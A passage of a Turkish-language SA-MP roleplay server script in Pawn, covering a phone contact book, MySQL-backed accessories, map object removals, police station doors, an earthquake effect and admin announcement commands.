	Karakter[giveplayerid][rutbe],
	Karakter[giveplayerid][kodes],
	Karakter[giveplayerid][ajail],
	Karakter[giveplayerid][telno],
	Karakter[giveplayerid][chatstili],
	Karakter[giveplayerid][meslek],
	Karakter[giveplayerid][uesrar],
	Karakter[giveplayerid][usaksi],
	Karakter[giveplayerid][esrartohum],
	KarakterOzellik[giveplayerid][Guc],
	Karakter[giveplayerid][kaspuan],
	Karakter[giveplayerid][matA],
	Karakter[giveplayerid][matB],
	Karakter[giveplayerid][matC],
	Karakter[giveplayerid][matD],
	Karakter[giveplayerid][matE]);
	ShowPlayerDialog(playerid, 103, DIALOG_STYLE_TABLIST, "Karakter Düzenle", string, "Seç", "Vazgeç");
}

stock UzunMesaj(cmdtext[], idx)
{
	new length = strlen(cmdtext);
	while ((idx < length) && (cmdtext[idx] <= ' '))
	{
		idx++;
	}
	new offset = idx;
	new result[256];
	while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
	{
		result[idx - offset] = cmdtext[idx];
		idx++;
	}
	result[idx - offset] = EOS;
	return result;
}

YayinGonder(renk, yazi[])
{
	for(new i; i < MAX_PLAYERS; i++)
	{
	    if(Yayin[i]) SendClientMessage(i, renk, yazi);
	}
}
stock RehberID(playerid, id, isim[], &num)
{
	new i = (id-1)*2;
	new data[4096];
 	GetPVarString(playerid, "Player_Tel_Rehber", data, 4096);
	new content[MAX_REHBER_LIST*2][25]; //content[Çift sayýlar isim // tek sayýlar numara]

	explode(content,data, "|");
	if(content[i][0])
	{
     	format(isim, 25, content[i]);
	    num = strval(content[i+1]);
	}
}

stock GetRehber(playerid, tur = 0)
{
	new data[4096];
 	GetPVarString(playerid, "Player_Tel_Rehber", data, 4096);
	new lenght = MAX_REHBER_LIST*2;
	new content[MAX_REHBER_LIST*2][25]; //content[Çift sayýlar isim // tek sayýlar numara]

    new string[500];
	format(string, sizeof(string), "Ýsim\tNumara\n[Yeni Kiþi Ekle]");

	explode(content,data, "|");
	for(new i; i < lenght;i+=2)
	{
		if(content[i][0])
		{
		    new isim[25];
		    format(isim, sizeof(isim), "\n%s\t%s", content[i], content[i+1]);
		    //print(isim);
			strins(string, isim, strlen(string));
			new ver[26];
			format(ver, sizeof(ver), "i: %d", i);
			//print(ver);
		}
	}
	if(!tur) ShowPlayerDialog(playerid, 122, DIALOG_STYLE_TABLIST_HEADERS, "Telefon Rehberi", string, "Ýþlem", "Vazgeç");
	else if(tur) ShowPlayerDialog(playerid, 137, DIALOG_STYLE_TABLIST_HEADERS, "Telefon Rehberi", string, "Ýþlem", "Vazgeç");
}

RehberEkle(playerid, isim[], num)
{
	new Rehber[4096], string[128];
	GetPVarString(playerid, "Player_Tel_Rehber", Rehber, 4096);
	new _isim[256];
	format(_isim, sizeof(_isim), "%s", isim);
	strreplace(_isim, "ü", "u");
	strreplace(_isim, "Ü", "U");
	strreplace(_isim, "ö", "o");
	strreplace(_isim, "Ö", "O");
	strreplace(_isim, "ý", "i");
	strreplace(_isim, "Ý", "I");
	strreplace(_isim, "ð", "g");
	strreplace(_isim, "Ð", "G");
	strreplace(_isim, "þ", "s");
	strreplace(_isim, "Þ", "S");
	strreplace(_isim, "ç", "c");
	strreplace(_isim, "Ç", "C");
	format(string, sizeof(string), "%s|%d|", _isim, num);
	strins(Rehber, string, strlen(Rehber));
	SetPVarString(playerid, "Player_Tel_Rehber", Rehber);
	new query[256];
	format(query, sizeof(query), "INSERT INTO `rehber` (`oyuncuID`, `rehberIsim`, `rehberNumara`) VALUES ('%d', '%s', '%d')", Karakter[playerid][sqlid], EscapeString(_isim), num);
	mysql_tquery(1,query);
	//RehberKaydet(playerid);

	format(string, sizeof(string), "Yeni kiþi kaydý baþarýlý. Ýsim: %s Numara: %d", _isim, num);
	Bilgi(playerid, string);
}

stock explode(aExplode[][], const sSource[], const sDelimiter[] = " ", iVertices = sizeof aExplode, iLength = sizeof aExplode[])
{
        new
                iNode,
                iPointer,
                iPrevious = -1,
                iDelimiter = strlen(sDelimiter);

        while(iNode < iVertices)
        {
                iPointer = strfind(sSource, sDelimiter, false, iPointer);

                if(iPointer == -1)
                {
                        strmid(aExplode[iNode], sSource, iPrevious, strlen(sSource), iLength);
                        break;
                }
                else
                {
                        strmid(aExplode[iNode], sSource, iPrevious, iPointer, iLength);
                }

                iPrevious = (iPointer += iDelimiter);
                ++iNode;
        }

        return iPrevious;
}
stock RehberIsim(playerid, num)
{
	new RehberText[4096], pos[2], oyuncuismi[25], searchtext[64];
	GetPVarString(playerid, "Player_Tel_Rehber", RehberText, 4096);
	format(searchtext, 12, "|%d|",num);
	strmid(oyuncuismi, "oyuncuismiyok", 0, 13);
	if(-1 != (pos[0]=strfind(RehberText, searchtext)))
	{
	    pos[1] = pos[0]-1;
		while(pos[1] && RehberText[pos[1]] != '|')pos[1]--;
		if(pos[1]!= 0) pos[1]++;
	    strmid(oyuncuismi, RehberText, pos[1], pos[0]);
	}
	return oyuncuismi;
}

AksesuarGuncelle(playerid,index)
{
	if(index > -1 && index < 5)
	{
		if(MySQLCheckAksesuar(Karakter[playerid][sqlid],index) != 0)
		{
			new query[300];
			format(query,sizeof(query),
			"UPDATE `aksesuarlar` SET `abone`='%d',`amodel`='%d',`akX`='%f',`akY`='%f',`akZ`='%f',`arX`='%f',`arY`='%f',`arZ`='%f',`aoX`='%f',`aoY`='%f',`aoZ`='%f',`arenk1`='%d',`arenk2`='%d',`giyilmis`='%d' WHERE `id`='%d' AND `aindex`='%d'",
			aksesuar[playerid][index][abone],
			aksesuar[playerid][index][amodel],
			aksesuar[playerid][index][akX],
			aksesuar[playerid][index][akY],
			aksesuar[playerid][index][akZ],
			aksesuar[playerid][index][arX],
			aksesuar[playerid][index][arY],
			aksesuar[playerid][index][arZ],
			aksesuar[playerid][index][aoX],
			aksesuar[playerid][index][aoY],
			aksesuar[playerid][index][aoZ],
			aksesuar[playerid][index][arenk1],
			aksesuar[playerid][index][arenk2],
			aksesuar[playerid][index][giyilmis],
			Karakter[playerid][sqlid],
			index);
			mysql_tquery(1,query);
		}
	}
}

forward MySQLCheckAksesuar(ssid,index);
public MySQLCheckAksesuar(ssid,index) // by WIZI
{
	new query[1024];
	format(query, sizeof(query), "SELECT `amodel` FROM `aksesuarlar` WHERE `id`='%d' and `aindex`='%d' LIMIT 1", ssid,index);
	new Cache:cache = mysql_query(query,true);
	if (!cache_get_row_count())
	{
	    cache_delete(cache);
		return 0;
	}
	else
	{
		new intid = cache_get_row_int(0,0);
	    cache_delete(cache);
		return intid;
	}
}

stock GetAksesuarNameFromList(modelid)
{
	new string[32] = "(Bilinmiyor)";
	for(new x=0;x<sizeof(AttachmentObjects);x++)
	{
		if(modelid == AttachmentObjects[x][attachmodel])
		{
			format(string,sizeof(string),"%s",AttachmentObjects[x][attachname]);
			return string;
		}
	}
	for(new p=0;p<sizeof(polAttach);p++)
	{
		if(modelid == polAttach[p][attachmodel])
		{
			format(string,sizeof(string),"%s",polAttach[p][attachname]);
			return string;
		}
	}
	return string;
}

AksesuarYukle(playerid){
	for(new x=0;x<5;x++){
		if(MySQLCheckAksesuar(Karakter[playerid][sqlid],x) != 0)
		{
			aksesuar[playerid][x][abone] = strval(gSQL_GetAks("abone",Karakter[playerid][sqlid],x));
			aksesuar[playerid][x][amodel] = strval(gSQL_GetAks("amodel",Karakter[playerid][sqlid],x));
			aksesuar[playerid][x][akX] = floatstr(gSQL_GetAks("akX",Karakter[playerid][sqlid],x));
			aksesuar[playerid][x][akY] = floatstr(gSQL_GetAks("akY",Karakter[playerid][sqlid],x));
			aksesuar[playerid][x][akZ] = floatstr(gSQL_GetAks("akZ",Karakter[playerid][sqlid],x));
			aksesuar[playerid][x][arX] = floatstr(gSQL_GetAks("arX",Karakter[playerid][sqlid],x));
			aksesuar[playerid][x][arY] = floatstr(gSQL_GetAks("arY",Karakter[playerid][sqlid],x));
			aksesuar[playerid][x][arZ] = floatstr(gSQL_GetAks("arZ",Karakter[playerid][sqlid],x));
			aksesuar[playerid][x][aoX] = floatstr(gSQL_GetAks("aoX",Karakter[playerid][sqlid],x));
			aksesuar[playerid][x][aoY] = floatstr(gSQL_GetAks("aoY",Karakter[playerid][sqlid],x));
			aksesuar[playerid][x][aoZ] = floatstr(gSQL_GetAks("aoZ",Karakter[playerid][sqlid],x));
			aksesuar[playerid][x][arenk1] = strval(gSQL_GetAks("arenk1",Karakter[playerid][sqlid],x));
			aksesuar[playerid][x][arenk2] = strval(gSQL_GetAks("arenk2",Karakter[playerid][sqlid],x));
			aksesuar[playerid][x][giyilmis] = bool:strval(gSQL_GetAks("giyilmis",Karakter[playerid][sqlid],x));
			//printf("%d,%d,%f,%f,%f,%f,%f,%f,%f,%f,%f,%d,%d,%d",aksesuar[playerid][x][amodel],aksesuar[playerid][x][abone],aksesuar[playerid][x][akX],aksesuar[playerid][x][akY],aksesuar[playerid][x][akZ],aksesuar[playerid][x][arX],aksesuar[playerid][x][arY],aksesuar[playerid][x][arZ],aksesuar[playerid][x][aoX],aksesuar[playerid][x][aoY],aksesuar[playerid][x][aoZ],aksesuar[playerid][x][arenk1],aksesuar[playerid][x][arenk2],aksesuar[playerid][x][giyilmis]);
		}
	}
}
stock gSQL_GetAks(column[],is,indx)
{
	new sqlcmd[1024];
	format(sqlcmd, sizeof(sqlcmd), "SELECT `%s` FROM `aksesuarlar` WHERE `id` = '%d' AND `aindex`='%d' LIMIT 1;",column,is,indx);
	new Cache:cache = mysql_query(sqlcmd,true);
	if (!cache_get_row_count()) {
	    format(sqlcmd,sizeof(sqlcmd),"Ax%d HATASI",is);
		return sqlcmd;
	}
	cache_get_row(0,0,sqlcmd);
	cache_delete(cache);
	return sqlcmd;
}

ObjeleriSil(playerid)
{
	// DONME DOLAP
    RemoveBuildingForPlayer(playerid, 6463, 389.7734, -2028.4688, 19.8047, 0.5);
    RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2035.3828, 29.9531, 50);
    RemoveBuildingForPlayer(playerid, 6298, 389.7734, -2028.4688, 19.8047, 0.5);
    RemoveBuildingForPlayer(playerid, 6461, 389.7734, -2028.5000, 20.1094, 0.5);
    RemoveBuildingForPlayer(playerid, 3752, 389.8750, -2028.5000, 32.2266, 50);
	// Ogo Map Atmýþtý SAMP SCRIPTS
	RemoveBuildingForPlayer(playerid, 673, 2543.439, -1515.260, 22.695, 0.250);
	RemoveBuildingForPlayer(playerid, 1308, 2539.800, -1515.949, 23.195, 0.250);
	RemoveBuildingForPlayer(playerid, 620, 2568.780, -1511.050, 20.929, 0.250);
	RemoveBuildingForPlayer(playerid, 673, 2563.959, -1515.339, 22.296, 0.250);
	RemoveBuildingForPlayer(playerid, 1297, 2522.979, -1508.959, 26.304, 0.250);
	RemoveBuildingForPlayer(playerid, 616, 2542.219, -1525.380, 21.960, 0.250);
	RemoveBuildingForPlayer(playerid, 620, 2552.570, -1550.020, 20.929, 0.250);
	RemoveBuildingForPlayer(playerid, 673, 2542.169, -1554.050, 21.601, 0.250);
	RemoveBuildingForPlayer(playerid, 616, 2528.709, -1556.680, 21.468, 0.250);
	RemoveBuildingForPlayer(playerid, 620, 2526.219, -1581.640, 20.929, 0.250);
	RemoveBuildingForPlayer(playerid, 620, 2510.560, -1563.479, 21.804, 0.250);
	RemoveBuildingForPlayer(playerid, 620, 2490.449, -1585.869, 20.796, 0.250);
	RemoveBuildingForPlayer(playerid, 1297, 2764.080, -1176.189, 71.796, 0.250);
	RemoveBuildingForPlayer(playerid, 1530, 2766.090, -1197.140, 69.070, 0.250);
	RemoveBuildingForPlayer(playerid, 1530, 2756.010, -1388.130, 39.460, 0.250);
	//Santa Maria Donut
	RemoveBuildingForPlayer(playerid, 6459, 387.8906, -1900.4375, 9.3906, 0.25);
	RemoveBuildingForPlayer(playerid, 6460, 387.5781, -1918.3672, 8.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 377.4531, -1915.7891, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1215, 384.4297, -1929.8047, 7.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 6299, 387.5781, -1918.3672, 8.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 6289, 387.8906, -1900.4375, 9.3906, 0.25);
	// balýkçýlýk için efekan ekledi
	RemoveBuildingForPlayer(playerid, 6465, 368.0547, -2028.2422, 8.7344, 0.25);
	RemoveBuildingForPlayer(playerid, 6462, 368.0547, -2028.2422, 8.7344, 0.25);
	// hastane
	RemoveBuildingForPlayer(playerid, 1297, 1190.7734, -1320.8594, 15.9453, 0.25);
	// Zomboy East LS
	RemoveBuildingForPlayer(playerid, 17535, 2364.0547, -1391.5313, 41.3516, 0.25);
	RemoveBuildingForPlayer(playerid, 1261, 2356.3906, -1313.9922, 39.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 17970, 2364.0547, -1391.5313, 41.3516, 0.25);
	RemoveBuildingForPlayer(playerid, 1267, 2356.3906, -1313.9922, 39.6953, 0.25);
	// biþiler
	RemoveBuildingForPlayer(playerid, 1231, 154.66417, -1799.6652, 3.93898, 200.0); //StreetLamp on Pier
	RemoveBuildingForPlayer(playerid, 1231, 154.69829, -1839.199, 3.34166, 200.0); //StreetLamp on Pier
	RemoveBuildingForPlayer(playerid, 1231, 154.54057, -1887.2585, 3.97951, 200.0); //StreetLamp on Pier
	// oci el corona basketbol adlý maplerin removelarý
	RemoveBuildingForPlayer(playerid, 1226, 1936.2578, -2039.0156, 16.3438, 0.25);
	RemoveBuildingForPlayer(playerid, 1308, 1951.2344, -2017.7891, 11.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1936.2578, -1999.3828, 16.3438, 0.25);
	// Zomboy Sahil
	RemoveBuildingForPlayer(playerid, 3778, 445.0313, -1875.0000, 3.7422, 0.25);
	RemoveBuildingForPlayer(playerid, 3615, 445.0313, -1875.0000, 3.7422, 0.25);
	//GÝSELER
	RemoveBuildingForPlayer(playerid, 4504, 56.3828, -1531.4531, 6.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 4515, 604.5234, 352.5391, 19.7344, 0.25);
}

ObjeYukle()
{
	//CreateDynamicObject(18233, 356.68, -2031.01, 6.95,   0.00, 0.00, 38.00);
}

stock KillTimerEx(timerid)
{
	if(timerid != 0) return KillTimer(timerid);
	return -1;
}

MoveStroyObject(object,Float:X,Float:Y,Float:Z,Float:speed)
{
	new Float:rX,Float:rY,Float:rZ;
	GetDynamicObjectRot(object,rX,rY,rZ);
	return MoveDynamicObject(object,X,Y,Z,speed,rX,rY,rZ);
}

RutbesiniVer(playerid)
{
    new string[128];
	if(Karakter[playerid][birlik] != 0)
	{
	    if(Karakter[playerid][rutbe] == 1) format(string, sizeof(string), Birlik[Karakter[playerid][birlik]][rutbe1]);
	    if(Karakter[playerid][rutbe] == 2) format(string, sizeof(string), Birlik[Karakter[playerid][birlik]][rutbe2]);
	    if(Karakter[playerid][rutbe] == 3) format(string, sizeof(string), Birlik[Karakter[playerid][birlik]][rutbe3]);
	    if(Karakter[playerid][rutbe] == 4) format(string, sizeof(string), Birlik[Karakter[playerid][birlik]][rutbe4]);
	    if(Karakter[playerid][rutbe] == 5) format(string, sizeof(string), Birlik[Karakter[playerid][birlik]][rutbe5]);
	    if(Karakter[playerid][rutbe] == 6) format(string, sizeof(string), Birlik[Karakter[playerid][birlik]][rutbe6]);
	    if(Karakter[playerid][rutbe] == 7) format(string, sizeof(string), Birlik[Karakter[playerid][birlik]][rutbe7]);
	    if(Karakter[playerid][rutbe] == 8) format(string, sizeof(string), Birlik[Karakter[playerid][birlik]][rutbe8]);
	    if(Karakter[playerid][rutbe] == 9) format(string, sizeof(string), Birlik[Karakter[playerid][birlik]][rutbe9]);
	    if(Karakter[playerid][rutbe] == 10) format(string, sizeof(string), Birlik[Karakter[playerid][birlik]][rutbe10]);
	    if(Karakter[playerid][rutbe] == 11) format(string, sizeof(string), Birlik[Karakter[playerid][birlik]][rutbe11]);
	    if(Karakter[playerid][rutbe] == 12) format(string, sizeof(string), Birlik[Karakter[playerid][birlik]][rutbe12]);
	    if(Karakter[playerid][rutbe] == 13) format(string, sizeof(string), Birlik[Karakter[playerid][birlik]][rutbe13]);
	    if(Karakter[playerid][rutbe] == 14) format(string, sizeof(string), Birlik[Karakter[playerid][birlik]][rutbe14]);
	    if(Karakter[playerid][rutbe] == 15) format(string, sizeof(string), Birlik[Karakter[playerid][birlik]][rutbe15]);
	    if(Karakter[playerid][rutbe] == 16) format(string, sizeof(string), Birlik[Karakter[playerid][birlik]][rutbe16]);
	    if(Karakter[playerid][rutbe] == 17) format(string, sizeof(string), Birlik[Karakter[playerid][birlik]][rutbe17]);
	    if(Karakter[playerid][rutbe] == 18) format(string, sizeof(string), Birlik[Karakter[playerid][birlik]][rutbe18]);
	    if(Karakter[playerid][rutbe] == 19) format(string, sizeof(string), Birlik[Karakter[playerid][birlik]][rutbe19]);
	    if(Karakter[playerid][rutbe] == 20) format(string, sizeof(string), Birlik[Karakter[playerid][birlik]][rutbe20]);
	    return string;
	}
	return string;
}
PreloadPlayerAnims(playerid)
{
   	PreloadAnimLib(playerid,"BOMBER");
   	PreloadAnimLib(playerid,"RAPPING");
   	PreloadAnimLib(playerid,"SHOP");
	PreloadAnimLib(playerid,"BEACH");
	PreloadAnimLib(playerid,"SMOKING");
   	PreloadAnimLib(playerid,"FOOD");
   	PreloadAnimLib(playerid,"ON_LOOKERS");
   	PreloadAnimLib(playerid,"DEALER");
	PreloadAnimLib(playerid,"CRACK");
	PreloadAnimLib(playerid,"CARRY");
	PreloadAnimLib(playerid,"COP_AMBIENT");
	PreloadAnimLib(playerid,"PARK");
	PreloadAnimLib(playerid,"INT_HOUSE");
	PreloadAnimLib(playerid,"FOOD");
	PreloadAnimLib(playerid,"PED");
	PreloadAnimLib(playerid,"BLOWJOBZ");
}
WasteDeAMXersTime()
{
	new b;
	#emit load.pri b
	#emit stor.pri b
}
//*******************************************************EARTHQUAKE*******************************************************//
new SMALL_QUAKE = 100;
new AmountOfShakes[ MAX_PLAYERS ];
forward SetPlayerEarthquakeEffect   ( playerid, amount_of_shakes );
forward EarthquakeEffects           ( playerid, interval, bool:status );
public SetPlayerEarthquakeEffect( playerid, amount_of_shakes ){
    if( amount_of_shakes < AmountOfShakes[ playerid ] )
        return 0;
    AmountOfShakes[ playerid ] = amount_of_shakes;
    new vehicleid = GetPlayerVehicleID( playerid );
    if( vehicleid ){
        if( amount_of_shakes <= SMALL_QUAKE+200 ){
            SetVehicleAngularVelocity( vehicleid, 0.09, 0.033, 0.05 );
        } else SetVehicleAngularVelocity( vehicleid, 0.03, 0.03, 0.03 );
    }
    return EarthquakeEffects( playerid, 10, false );
}
public EarthquakeEffects( playerid, interval, bool:status ){
    if( AmountOfShakes[ playerid ] <= 0 )
        return SetPlayerDrunkLevel( playerid, 0 );
    if( !(AmountOfShakes[ playerid ]%5) ){
        new vehicleid = GetPlayerVehicleID( playerid );
        if( AmountOfShakes[ playerid ] <= SMALL_QUAKE+200 ){
            SetVehicleAngularVelocity( vehicleid, 0.03, 0.03, 0.03 );
        } else SetVehicleAngularVelocity( vehicleid, 0.015, 0.015, 0.015 );
    }
    if( status ){
        SetPlayerDrunkLevel( playerid, 3000 );
    } else SetPlayerDrunkLevel( playerid, 50000 );
    AmountOfShakes[ playerid ]--;
    return SetTimerEx( "EarthquakeEffects", interval, false, "iii", playerid, interval, !status );
}
//yaptým
EvSil(id)
{
	new query[256];
    Ev[id][eid] = 0;
    Ev[id][esahip] = -1;
    Ev[id][girisX] = 0;
  	Ev[id][girisY] = 0;
	Ev[id][girisZ] = 0;
	Ev[id][cikisX] = 0;
    Ev[id][cikisY] = 0;
    Ev[id][cikisZ] = 0;
    Ev[id][egirisint] = 0;
    Ev[id][egirisvw] = 0;
 	Ev[id][ecikisint] = 0;
    Ev[id][ecikisvw] = 0;
    Ev[id][ekilit] = 0;
    Ev[id][kira] = 0;
    Ev[id][kirafiyat] = 0;
    Ev[id][kiralayan] = -1;
    Ev[id][efiyat] = 0;
    Ev[id][egirisangle] = 0;
    Ev[id][ecikisangle] = 0;
    Ev[id][silah1] = 0;
    Ev[id][mermi1] = 0;
    Ev[id][silah2] = 0;
    Ev[id][mermi2] = 0;
    Ev[id][silah3] = 0;
    Ev[id][mermi3] = 0;
    //DestroyDynamicPickup(Ev[id][epickup]);
	//Ev[id][epickup] = 0;
    //DestroyDynamic3DTextLabel(Ev[eid][etext]);
    DestroyColouredCheckpoint(Ev[id][ecp]);
    format(query, sizeof(query), "DELETE FROM `evler` WHERE `sqlid` = '%d'", id);
    mysql_tquery(1,query);
	Iter_Remove(Houses, id);
}
//yaptým

//MAPLER
CreateYukle()
{
	LSPDKapi();
	SanTVKapi();
	TamirciKapi();
}

TamirciKapi()
{
    MechLift = CreateDynamicObject(3036, 1569.34424, -2156.86060, 12.96720,   -90.00000, 0.00000, 90.00000);
}

SanTVKapi()
{
	SanTVGates[0][0] = CreateDynamicObject(969,774.0000000,-1330.1999500,12.7000000,0.0000000,0.0000000,0.0000000); //object(electricgate) (2)
	SanTVGates[1][0] = CreateDynamicObject(969,782.2999900,-1384.9000200,12.9000000,0.0000000,0.0000000,180.0000000); //object(electricgate) (3)
}

LSPDKapi()
{
	LSPDObjs[0][0] = CreateDynamicObject(968,1544.68,-1630.91,13.0231, 0,-90.1,-89.8357, _, 0, _, 200.0); //commander south
	LSPDObjs[0][1] = CreateDynamicObject(1569,232.89941406,110.57499695,1009.21179199,0.00000000,0.00000000,270.00000000, _, 10, _, 200.0); //commander north
	LSPDObjs[1][0] = CreateDynamicObject(1569,275.75000000,118.89941406,1003.61718750,0.00000000,0.00000000,270.00000000, _, 10, _, 200.0); // interrogation north
	LSPDObjs[1][1] = CreateDynamicObject(1569,275.75000000,115.89941406,1003.61718750,0.00000000,0.00000000,90.00000000, _, 10, _, 200.0); // interrogation south
	LSPDObjs[2][0] = CreateDynamicObject(1569,253.20410156,107.59960938,1002.22070312,0.00000000,0.00000000,90.00000000, _,10, _, 200.0); // north west lobby door
	LSPDObjs[2][1] = CreateDynamicObject(1569,253.19921875,110.59960938,1002.22070312,0.00000000,0.00000000,270.00000000, _,10, _, 200.0); // north east lobby door
	LSPDObjs[3][0] = CreateDynamicObject(1569,239.56933594,116.09960938,1002.22070312,0.00000000,0.00000000,90.00000000, _,10, _, 200.0); // south west lobby door
	LSPDObjs[3][1] = CreateDynamicObject(1569,239.56445312,119.09960938,1002.22070312,0.00000000,0.00000000,269.98901367, _,10, _, 200.0); // south east lobby door
	LSPDObjs[4][0] = CreateDynamicObject(1569,264.45019531,115.82421875,1003.62286377,0.00000000,0.00000000,0.00000000, _,10, _, 200.0); //object(gen_doorext15) (3)
	LSPDObjs[4][1] = CreateDynamicObject(1569,267.45214844,115.82910156,1003.62286377,0.00000000,0.00000000,179.99450684, _,10, _, 200.0); //object(gen_doorext15) (8)
	LSPDObjs[5][0] = CreateDynamicObject(1569,267.32000732,112.53222656,1003.62286377,0.00000000,0.00000000,179.99450684, _,10, _, 200.0); //object(gen_doorext15) (4)
	LSPDObjs[5][1] = CreateDynamicObject(1569,264.32000732,112.52929688,1003.62286377,0.00000000,0.00000000,0.00000000, _,10, _, 200.0); //object(gen_doorext15) (5)
	LSPDObjs[6][0] = CreateDynamicObject(1569,229.59960938,119.52929688,1009.22442627,0.00000000,0.00000000,0.00000000, _,10, _, 200.0); //object(gen_doorext15) (9)
	LSPDObjs[6][1] = CreateDynamicObject(1569,232.59960938,119.53515625,1009.22442627,0.00000000,0.00000000,179.99450684, _,10, _, 200.0); //object(gen_doorext15) (10)
	LSPDObjs[7][0] = CreateDynamicObject(1569,219.30000305,116.52999878,998.01562500,0.00000000,0.00000000,180.00000000, _,10, _, 200.0); //cell east door
	LSPDObjs[7][1] = CreateDynamicObject(1569,216.30000305,116.52929688,998.01562500,0.00000000,0.00000000,0.00000000, _,10, _, 200.0); //cell west door
}

forward ShutUp(slot);
public ShutUp(slot) { // One function for eight doors. A WINRAR IS YOU!
	if(LSPDObjs[slot][2] == 1) switch(slot) {
		case 0: {
			MoveDynamicObject(LSPDObjs[0][0],1544.68,-1630.91,13.0231, 3.5, 0,-90.1,-89.8357); //commander south
			LSPDObjs[0][2] = 0;
		}
		case 1: {
			MoveDynamicObject(LSPDObjs[1][0],275.75000000,118.89941406,1003.61718750,3.5); // interrogation north
			MoveDynamicObject(LSPDObjs[1][1],275.75000000,115.89941406,1003.61718750,3.5); // interrogation south
			LSPDObjs[1][2] = 0;
		}
		case 2: {
			MoveDynamicObject(LSPDObjs[2][0],253.20410156,107.59960938,1002.22070312,3.5); // north west lobby door
			MoveDynamicObject(LSPDObjs[2][1],253.19921875,110.59960938,1002.22070312,3.5); // north east lobby door
			LSPDObjs[2][2] = 0;
		}
		case 3: {
			MoveDynamicObject(LSPDObjs[3][0],239.56933594,116.09960938,1002.22070312,3.5); // south west lobby door
			MoveDynamicObject(LSPDObjs[3][1],239.56445312,119.09960938,1002.22070312,3.5); // south east lobby door
			LSPDObjs[3][2] = 0;
		}
		case 4: {
			MoveDynamicObject(LSPDObjs[4][0],264.45019531,115.82421875,1003.62286377,3.5); //object(gen_doorext15) (3)
			MoveDynamicObject(LSPDObjs[4][1],267.45214844,115.82910156,1003.62286377,3.5); //object(gen_doorext15) (8)
			LSPDObjs[4][2] = 0;
		}
		case 5: {
			MoveDynamicObject(LSPDObjs[5][0],267.32000732,112.53222656,1003.62286377,3.5); //object(gen_doorext15) (4)
			MoveDynamicObject(LSPDObjs[5][1],264.32000732,112.52929688,1003.62286377,3.5); //object(gen_doorext15) (5)
			LSPDObjs[5][2] = 0;
		}
		case 6: {
			MoveDynamicObject(LSPDObjs[6][0],229.59960938,119.52929688,1009.22442627,3.5); //object(gen_doorext15) (9)
			MoveDynamicObject(LSPDObjs[6][1],232.59960938,119.53515625,1009.22442627,3.5); //object(gen_doorext15) (10)
			LSPDObjs[6][2] = 0;
		}
		case 7: {
			MoveDynamicObject(LSPDObjs[7][0],219.30000305,116.52999878,998.01562500,3.5); //cell east door
			MoveDynamicObject(LSPDObjs[7][1],216.30000305,116.52929688,998.01562500,3.5); //cell west door
			LSPDObjs[7][2] = 0;
		}
	}
	return 1;
}

stock PlayerPlaySoundEx(soundid, Float:x123, Float:y, Float:z) { // Realistic sound playback
	foreach(new i : Player) {
		if(IsPlayerInRangeOfPoint(i, 30.0, x123, y, z))
			PlayerPlaySound(i, soundid, x123, y, z);
	}
	return 1;
}
CMD:hasarlar(playerid, params[])
{
    new id;
    if(sscanf(params, "u", id)) return Kullanim(playerid, "/hasarlar [playerid]");
    if(!IsPlayerConnected(id)) return Hata(playerid, "Bu kullanýcý baðlý deðil.");
    if(IsPlayerInRangeOfPlayer(playerid, id, 4.0))
    {
       	DisplayDamages(playerid, id);
	}
	else
	{
		Hata(playerid,"Kiþinin yakýnýnda olmalýsýnýz.");
	}
	return 1;
}
CMD:adminnick(playerid, params[]) return cmd_anick(playerid, params);
CMD:anick(playerid, params[])
{
	if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1 && IsPlayerConnected(playerid))
	{
		new mstring[24];
	    if(sscanf(params, "s[24]", mstring)) return Ipucu(playerid, "/adminnick (nick)");
	    //print(mstring);
	    format(Karakter[playerid][anick], 24, "%s", mstring);
	    //print(Karakter[playerid][anick]);
	    KarakterKaydet(playerid);
	    new nstring[256];
	    format(nstring, 256, "Admin nickiniz %s olarak ayarlandý.", mstring);
	    Bilgi(playerid, nstring);
	    return 1;
	}
    return 1;
}

CMD:adminskin(playerid, params[]) return cmd_askin(playerid, params);
CMD:askin(playerid, params[])
{
	if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1 && IsPlayerConnected(playerid))
	{
		new mskin;
	    if(sscanf(params, "d", mskin)) return Ipucu(playerid, "/adminskin (skinid)");
	    if(mskin < 0 || mskin > 311)
     		return Hata(playerid, "Hatalý skin id.");
	    Karakter[playerid][askin] = mskin;
	    new nstring[128];
	    format(nstring, sizeof(nstring), "Admin skininiz %d olarak ayarlandý.", mskin);
	    Bilgi(playerid, nstring);
	}
    return 1;
}

CMD:sesler(playerid, params[])
{
    if(Karakter[playerid][adminlevel] >= 4 && AKontrol(playerid))
	{
        if(!isnull(params))
		{
		    new test[128], MesajString[512];
			format(MesajString, sizeof(MesajString), "( {ffad60}Sokaktan Sesler: {FFFFFF}%s )",params);
			SendClientMessageToAll(COLOR_SYSTEM, MesajString);
			for(new a; a<MAX_PLAYERS; a++)
   			{
				if(Karakter[a][adminlevel] >= 1)
			    {
			    	format(test,sizeof(test),"[Admin]: %s, sokaktan sesler duyurusu yaptý.",Karakter[playerid][anick]);
			        SendClientMessage(a, COLOR_ORANGE, test);
				}
			}
		}
		else {
		    return Hata(playerid,"/sesler [yazý]");
		}
	}
	return 1;
}
CMD:havadurumu(playerid, params[])
{
    if(Karakter[playerid][adminlevel] >= 4 && AKontrol(playerid))
	{
        if(!isnull(params))
		{
		    new test[128], MesajString[512];
		    SendClientMessageToAll(0x00C300FF, "[HABER] Hava durumu haberleri;");
			format(MesajString, sizeof(MesajString), "[HABER] %s",params);
			SendClientMessageToAll(0x00C300FF, MesajString);
			for(new a; a<MAX_PLAYERS; a++)
   			{
				if(Karakter[a][adminlevel] >= 1)
			    {
			    	format(test,sizeof(test),"[Admin]: %s, hava durumu duyurusu yaptý.",Karakter[playerid][anick]);
			        SendClientMessage(a, COLOR_ORANGE, test);
				}
			}
		}
		else {
		    return Hata(playerid,"/havadurumu [yazý]");
		}
	}
	return 1;
}

CMD:ihbarlar(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
